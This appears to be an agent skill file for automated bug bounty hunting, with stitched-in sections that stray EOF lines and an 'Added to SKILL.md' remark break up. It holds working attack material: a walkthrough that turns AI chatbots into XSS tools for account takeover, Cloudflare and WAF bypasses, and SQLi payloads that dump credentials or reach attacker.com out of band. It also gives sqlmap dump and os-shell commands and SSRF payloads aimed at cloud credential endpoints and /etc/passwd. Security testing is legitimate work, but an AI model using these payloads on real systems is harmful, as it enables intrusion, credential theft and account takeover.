---
name: bug-bounty
description: Automated bug bounty hunting workflow - recon, scanning, and vulnerability assessment. Includes web, mobile, IoT, and binary analysis capabilities.
metadata:
  author: ola.zo.computer
allowed-tools: Bash, Read, Grep, Web-Read, Browser
---
# Bug Bounty Hunter Skill

This skill provides a complete recon and vulnerability scanning workflow for bug bounty hunting.

## Core Web Tools

- **subfinder** - Passive subdomain enumeration (/root/go/bin/subfinder)
- **amass** - Subdomain enumeration (backup to subfinder)
- **httpx** - HTTP probing for alive hosts (/root/go/bin/httpx)
- **nmap** - Network scanning and port detection (/usr/bin/nmap)
- **nuclei** - Vulnerability scanning with templates (/root/go/bin/nuclei)
- **ffuf** - Web fuzzing and directory busting (/root/go/bin/ffuf)
- **gowitness** - Website screenshots (/root/go/bin/gowitness)
- **whois** - Domain lookup
- **dig/nslookup** - DNS utilities

## Advanced Tools (For Specialized Attacks)

### Mobile App Analysis
- **Frida** - Dynamic instrumentation for iOS/Android
- **Objection** - Mobile security testing framework
- **Polar Proxy** - HTTPS interception for mobile apps

### IoT/Hardware Hacking
- **eMMC reader** - Extract firmware from IoT devices
- **Hot air station** - Remove chips for firmware extraction
- **Binwalk** - Firmware analysis
- **strct.pack** - Binary struct packing/unpacking

### Binary/Protocol Analysis
- **hex editor (xxd, hexdump)** - Binary analysis
- **protobuf parsers** - Analyze gRPC/Protobuf traffic
- **SIP/VoIP tools** - Test VoIP vulnerabilities (sipgrep, sipp)

## Attack Techniques (From $400K+ Bounties)

### Web Vulnerabilities
1. **URL Encoding Bypass** - Double URL encode to bypass 403 restrictions
2. **IDOR** - Insecure Direct Object Reference in numeric IDs
3. **XSS** - Stored XSS in admin panels
4. **SQLi** - SQL injection in unusual formats (protobuf, binary)
5. **Hardcoded Creds** - Find in JS files, docs, config files

### Key Mindset (Rhynorater)
- Spend 40+ hours understanding an application before expecting bugs
- Threat model changes = new attack surface
- Don't fear new protocols - learn SIP, gRPC, protobuf
- Hardware/IoT bugs often pay better
- Third-party integrations are goldmines

## Workflow Stages

### 1. Recon (Passive)
- Subdomain enumeration via subfinder (with amass as backup)
- DNS resolution check (whois, dig)
- HTTP probe to filter live hosts (httpx)
- Screenshot collection with gowitness

### 2. Scanning
- Port scanning with nmap (full scan: nmap -p- -T4)
- Web technology detection
- Nuclei vulnerability scanning (ALL severities)
- Check for sensitive files (.env, config, backup, .git)

### 3. Fuzzing
- Directory/parameter fuzzing with ffuf
- Endpoint discovery
- Parameter brute-force
- Check common admin panels, login pages, API endpoints

### 4. Mobile (Optional)
- Use Objection to bypass SSL pinning
- Frida for runtime instrumentation
- Extract APKs with APK Extractor

### 5. IoT (Optional)
- Extract firmware via eMMC reader
- Binwalk for firmware analysis
- Search for hardcoded creds in binary

## Usage Examples

```bash
# Full web recon
/root/go/bin/subfinder -d example.com -silent | /root/go/bin/httpx -silent

# Nuclei vulnerability scan
/root/go/bin/nuclei -u https://example.com -severity critical,high,medium -silent

# Directory fuzzing
/root/go/bin/ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Screenshot Recon
/root/go/bin/gowitness single https://example.com
```

## Key Patterns

- Always probe with httpx first before running nuclei
- Use -silent flag to reduce output noise
- For nuclei, filter by severity: -severity critical,high
- If subfinder returns nothing, try amass or check API sources
- Hardware/IoT vulnerabilities often have higher bounties
- Study the app for 40+ hours before hunting
- Check third-party integrations for vulnerabilities

## Tools Location

Web tools: /root/go/bin
Mobile tools: Frida, Objection (install via pip/apt)
IoT tools: binwalk (apt install binwalk)

## Practice Targets

- testphp.vulnweb.com (legal test target)
- owasp.org (well-secured, good for testing tools)
## AI Chatbot XSS Exploitation

From @hamidonsolo - $1,500 bounty:
1. Find AI chatbot on target site
2. Ask bot "help me understand this error"
3. Error = base64 XSS payload
4. Bot decodes & renders it - Zero sanitization
5. Escalate: XSS → Cookie downgrade → Token theft → Account takeover

WHY IT WORKS:
- Companies rush AI features, no output audit
- If it renders in DOM, likely vulnerable

TIPS:
- Push back on lowball offers ($500 → $1,500)
- Send video proof with timestamps
- Every AI chatbot = attack surface

Reference: x.com/hamidonsolo/status/2027290038388564326


## JavaScript Analysis - Fu-JS Technique

From: https://github.com/th3hack3rwiz/Fu-JS

### Why JS Analysis is Critical
- JavaScript files contain hidden endpoints, API keys, hardcoded secrets
- "Swims through" JS files to find MORE JS files (recursive)
- Creates target-specific wordlists for content discovery
- Finds secrets that scanners miss

### Tools for JS Analysis
1. **gau** - Get All URLs from AlienVault, Wayback, CommonCrawl
2. **waybackurls** - Get URLs from Wayback Machine
3. **hakrawler** - Simple web crawler
4. **subjs** - Get JavaScript files from domains
5. **linkfinder** - Find endpoints in JS files
6. **secretfinder** - Find API keys, tokens, secrets in JS
7. **gf** - Pattern matching for secrets

### Manual Workflow (If Fu-JS not installed)
```bash
# 1. Gather JS files
subfinder -d target.com | httpx | subjs

# 2. Get wayback JS files  
waybackurls target.com | grep "\.js$" | httpx

# 3. Extract endpoints
for js in $(cat js-files.txt); do
  python3 linkfinder.py -i $js -o cli
done

# 4. Find secrets
for js in $(cat js-files.txt); do
  python3 SecretFinder.py -i $js -o cli
done

# 5. Create wordlist from JS
cat js-files.txt | grep -oP '/[a-zA-Z0-9/]+' | anew wordlist.txt
```

### Key Patterns to Find in JS
- API endpoints (/api/, /v1/, /admin/)
- Hardcoded API keys, tokens, secrets
- Internal IP addresses
- Commented-out code (TODO, FIXME, passwords)
- AWS keys, Firebase configs
- JWT tokens, session cookies

### Install Commands
```bash
go install github.com/lc/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/lc/subjs@latest
pip3 install linkfinder
pip3 install secretfinder
go install github.com/tomnomnom/unfurl@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/gf@latest
```


## Mantra - API Key Finder (841 stars)
- **Purpose**: Hunt down API key leaks in JS files and pages
- **Install**: `go install github.com/Brosck/mantra@latest`
- **Location**: /root/go/bin/mantra
- **Usage**: `mantra -u https://target.com` or `cat js_files.txt | mantra`
- **Supported**: Firebase, AWS, Google API keys and more

Added to bug-bounty SKILL.md!

## Hidden Parameter Discovery + XSS via Payment Functions

From: Ahmad Yossef (@a7madn1) - $X bounty

### Attack Vector
1. **Register** an account on target (gets redirected to app.target.com)
2. **Quick Test** search parameters for XSS, open redirect - no results
3. **Discover Hidden Parameters** - Look for undocumented params like "u", "ref", "token"
4. **Find Reflection Points** - Check different app functions (payment pages, settings, etc.)
5. **Exploit** - The "u" parameter was reflected in payment currency switcher

### Key Steps
- Always check hidden/uncommon parameters
- Source code review reveals vulnerable parameters
- Payment/currency switcher functions often reflect user input
- Example: `https://app.target.com/?value=4&fx=0&u=<XSS_PAYLOAD>`

### Why It Works
- Developers focus on main search parameters
- Payment functions have different security review
- Hidden parameters often forgotten in security audits

EOF


## Scrapling - Adaptive Web Scraping Framework

From: github.com/D4Vinci/Scrapling (18.3k stars)

### What It Does
- Adaptive web scraping that survives website design changes
- Bypasses anti-bot systems (Cloudflare, etc.) out of the box
- Full spider framework with pause/resume capability
- Multi-session support with proxy rotation
- Built-in MCP server for AI integration

### Key Features for Bug Bounty
- **StealthyFetcher** - Bypasses Cloudflare Turnstile, anti-bot detection
- **Adaptive Parsing** - Parser learns from website changes, auto-relocates elements
- **Concurrent Crawling** - Scale to multi-session crawls
- **Proxy Rotation** - Built-in automatic proxy rotation

### Installation
```bash
pip install scrapling[all]
scrapling install  # Install browser dependencies
```

### Usage Examples
```python
from scrapling.fetchers import StealthyFetcher

# Bypass bot detection
p = StealthyFetcher.fetch('https://target.com', headless=True)

# Adaptive parsing - survives website changes
products = p.css('.product', adaptive=True)
```

### Bug Bounty Use Cases
1. **Recon** - Scrape target pages for endpoints, APIs
2. **Parameter Discovery** - Find hidden params across many pages
3. **JavaScript Analysis** - Dynamic content extraction
4. **Bypass WAF/Cloudflare** - StealthyFetcher evades detection

---

## Bypass Bot Detection - Burp Suite Extension

From: PortSwigger BApp Store

### What It Does
- Mutates TLS ciphers to bypass TLS-fingerprint based bot detection
- Allows testing that would normally be blocked

### Modes
- **Firefox Mode** - Firefox ciphers + User-Agent
- **Chrome Mode** - Chrome ciphers + User-Agent  
- **Safari Mode** - Safari ciphers + User-Agent
- **HTTP2 Downgrade** - Bypass HTTP/2 fingerprinting
- **Brute Force Mode** - Try different TLS combinations

### Installation
1. Download from BApp Store in Burp Suite Extender
2. Or: Settings -> Network -> TLS -> Enable custom protocols and ciphers

### Usage
1. Right-click on request in Proxy History
2. Extensions -> Bypass bot detection -> Select mode
3. If response changes (different words/headers), vulnerability found

### Bug Bounty Use Cases
- Bypass anti-bot protections on targets
- Access endpoints normally blocked to automated tools
- Test for WAF bypass via TLS fingerprinting

EOF


## Report Structure Template

Use this structure for all bug bounty reports:

```markdown
# [Target] - Vulnerability Assessment

## Executive Summary
Brief overview of findings.

---

## Critical Findings

### 1. [Finding Name] (SEVERITY)
- **Finding**: Description
- **Value/Payload**: Actual data
- **Impact**: Security impact
- **Location**: Where found

### 2. [Finding Name] (SEVERITY)
...

## Medium Findings

### 1. [Finding Name]
...

## Low Findings

### 1. [Finding Name]
...

## Recommendations
Steps to fix each finding.
```

Example for Next.js targets:
- Check for deployment ID in HTML comments
- Extract React component names from SSR
- Find source map paths in static files
- Identify tech stack from meta tags
- Look for empty GA4/GTM IDs (config errors)
- Check API error messages for info disclosure
```


## Cloudflare Bypass Methods

### 1. Scrapling (Recommended)
```bash
pip3 install "scrapling[fetch]"
python3 -c "
from scrapling import Fetcher
f = Fetcher().init()
r = f.get('https://target.com')
print(r.text)
"
```

### 2. Playwright (Browser Automation)
```bash
pip3 install playwright
playwright install chromium
```
Python code shown above in AGENTS.md.

### 3. Manual curl Headers
Always include these headers to bypass basic Cloudflare checks:
- `-H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
- `-H "accept: text/html,application/xhtml+xml"`
- `-H "accept-language: en-US,en;q=0.9"`

### Why These Work:
- Scrapling uses curl_cffi with real browser fingerprints
- Playwright runs actual Chrome browser (Cloudflare sees real browser)
- curl with proper headers mimics real browser requests


## From six2dez/pentest-book (Ultimate Reference)

This is one of the most comprehensive pentesting resources. Key sections:

### Bug Bounty Specific (from others/bugbounty.md)
- Recon methodology for BB targets
- Private program scope testing
- Program-specific techniques
- Report writing tips

### Key Attack Vectors Documented
- All web vulnerabilities: SQLi, XSS, SSRF, XXE, IDOR, LFI, RCE
- API Security testing
- OAuth/PKCE vulnerabilities  
- GraphQL security testing
- Race conditions
- Web Cache Poisoning/Deception
- Prototype Pollution

### CMS/Platform Exploits
- WordPress, Drupal, Joomla
- Jenkins, Jira
- Adobe AEM, SAP, Magento
- Firebase, AWS, Azure, GCP
- Docker/K8s

### Cloud Security
- AWS enumeration & exploitation
- Azure AD attacks
- GCP misconfigurations
- Serverless vulnerabilities

### Tools & Techniques Reference
- Burp Suite extensions (preferred)
- Web fuzzers comparison
- Subdomain enumeration tools review
- Recon suites comparison
- Password cracking
- LLM/AI security testing

### Important Files to Check
- /enumeration/ - Web attack techniques
- /recon/ - Recon methodology
- /exploitation/ - Shells & priv esc
- /post-exploitation/ - AD, Linux, Windows
- /mobile/ - Android & iOS
- /cloud/ - AWS, Azure, GCP, K8s
- /others/ - Tools, checklists, mindmaps

Reference: https://github.com/six2dez/pentest-book (1.9k stars)


## AI-Augmented Threat Actors (From AWS CTI Report)

Source: AWS Threat Intelligence - Feb 2026

### Attack Vector
- Exposed management interfaces (ports 443, 8443, 10443, 4443)
- Weak/reused credentials
- Single-factor authentication
- NOT via exploits - purely credential-based

### High-Value Targets
- FortiGate config files contain:
  - SSL-VPN credentials (recoverable passwords)
  - Administrative credentials
  - Network topology & routing info
  - Firewall policies
  - IPsec VPN peer configs

### Post-Exploitation Tools
- Meterpreter + mimikatz for DCSync attacks
- Impacket for lateral movement
- gogo - open-source port scanner
- Nuclei for vulnerability scanning
- PowerShell scripts for credential extraction

### CVEs Referenced (in attacks)
- CVE-2019-7192 (FortiGate)
- CVE-2023-27532 (Veeam)
- CVE-2024-40711 (Veeam)

### IOCs (Threat Actor Infrastructure)
- 212.11.64.250 - scanning/exploitation
- 185.196.11.225 - threat operations

### Key Lessons for Bug Bounty
1. AI helps unsophisticated actors scale
2. Strong fundamentals beat advanced attacks
3. Target backup infrastructure (high value)
4. Automated tools = detectable - focus on anomalies
5. AI-generated code lacks robustness - edge cases fail


---

## SQL Injection (SQLi) - Comprehensive Guide

Source: YesWeHack Bug Bounty Guide (2025)

### What is SQL Injection?
SQL injection occurs when untrusted input is embedded into SQL queries, altering intended logic. Can lead to unauthorized data access, modification, deletion, privilege escalation, or RCE.

### Types of SQLi

#### 1. In-band SQLi (Classic)
- Error-based: Trigger database errors to leak info
- UNION-based: Use UNION to extract data from other tables

#### 2. Blind SQLi
- Boolean-based: Infer data from true/false responses
- Time-based: Use SLEEP() to measure response delays

#### 3. Out-of-Band (OOB) SQLi
- DNS/HTTP callbacks when in-band responses are blocked
- Use xp_dirtree (MSSQL), LOAD_FILE() (MySQL)

#### 4. Second-Order SQLi
- Malicious input stored, executed later in different context
- Common in microservices

### Key Payloads

#### Basic Detection
```
' OR 1=1-- -
' OR 'a'='a
' ORDER BY 1-- - (find column count)
```

#### UNION-Based
```
' UNION SELECT NULL-- -
' UNION SELECT username,password FROM users-- -
```

#### Time-Based (MySQL)
```
' OR SLEEP(5)-- -
' OR BENCHMARK(40000000,SHA1(1337))-- -
```

#### Time-Based (MSSQL)
```
'; IF (1=1) WAITFOR DELAY '0:0:05'-- -
```

#### Error-Based (MySQL)
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
```

#### OOB (MSSQL)
```
'; EXEC master..xp_dirtree '//attacker.com/sql-- -
```

### Context-Aware Payloads

#### SELECT statements
```
?id=1' OR 1=1-- -
```

#### INSERT statements
```
username: x', (SELECT password FROM users), 'y')-- -
```

#### UPDATE statements
```
comment: x' OR 1=1-- -
```

### WAF Bypass Techniques

1. **Comment obfuscation**: `'/**/OR/**/1=1-- -`
2. **Newline instead of space**: `'OR%0A1=1-- -`
3. **Parentheses**: `'OR(1=1)-- -`
4. **Case randomization**: `'oR 1=1-- -`

### SQLmap Commands
```bash
# Basic scan
sqlmap -u 'http://target.com/search?q=test'

# With cookies
sqlmap -u 'http://target.com/search' --data='q=test' --cookie='PHPSESSID=xxx'

# Specific parameter
sqlmap -u 'http://target.com/search' -p q --level=5

# Database enumeration
sqlmap -u 'http://target.com/search?q=test' --dbs

# Table enumeration
sqlmap -u 'http://target.com/search?q=test' -D database_name --tables

# Dump data
sqlmap -u 'http://target.com/search?q=test' -D database_name -T users --dump

# OS Shell
sqlmap -u 'http://target.com/search?q=test' --os-shell
```

### SQLi Prevention (For Testing)
- Parameterized queries/prepared statements
- Least-privilege database access
- Input validation
- WAF as extra layer


## IDOR Testing Techniques

**Mindset**: Every numeric/string ID that references an object = potential ticket to god-mode.

### Systematic Testing:

1. **Basic ID Manipulation**
   - Change ID in URL: `/user/1337` → `/user/1338` (vertical + horizontal)
   - Change IDs in API requests: `{"user_id": 1337}` → `{"user_id": 1338}`

2. **Advanced Techniques**
   - Array wrapping: `id=1337` → `id[]=1337&id[]=1338`
   - JSON body: add extra parameters like `{"role":"admin"}` or `{"is_owner":true}`
   - GUID/UUID flipping (last 4 chars usually sequential)
   - Base64 decode → increment → re-encode
   - Hash manipulation: crack with known plaintext (MD5(1337) etc.)

3. **Automation**
   - Burp Intruder + custom wordlist (1..999999, UUID v4 patterns)
   - Look for 200 OK with different user data

### Key Endpoints to Test:
- `/api/user/{id}`
- `/profile/{id}/edit`
- `/api/orders/{id}`
- `/api/records/{id}/delete`
- Any PUT/PATCH/DELETE with IDOR potential

### Test Cases:
- **Horizontal**: Access another user's same-level resource
- **Vertical**: Access admin/superuser resources as regular user
- **Object-level**: Access another object's data (e.g., private document)

### Look For:
- 200 OK with different user data
- Different response size
- Extra fields in JSON response
- Status code changes (sometimes 403 with admin data inside)

### SSRF (Server-Side Request Forgery)
Exploit server-side request handling to access internal services, cloud metadata

#### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Google
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### Basic Protocols (all supported)
```
http://127.0.0.1:8080/
http://localhost:22/
file:///etc/passwd
gopher://127.0.0.1:3306/_mysql
dict://127.0.0.1:11211/stat
ftp://internal-server/
tftp://attacker/
ldap://127.0.0.1
data:text/plain;base64,SSBsb3ZlIFNRRkU=
```

#### Advanced Techniques
1. **Redirect Chains**: Send server to your collab server (302) -> internal
2. **DNS Rebinding**: Domain resolves to external, then 127.0.0.1 after TTL
3. **URL Scheme Abuse**: ftp://, tftp://, ldap://, data: schemes
4. **Bypass Methods**:
   - http://127.0.0.1%00@attacker.com
   - IPv6: http://[::1]
   - Decimal: http://2130706433
   - Hex: http://0x7f000001

#### Testing Checklist
- Parameter reflection in URL (parameter=...)
- Image uploads (URL in metadata)
- Webhooks
- PDF generators
- URL preview features
- SSRF proxies: Burp Collaborator, Interact.sh
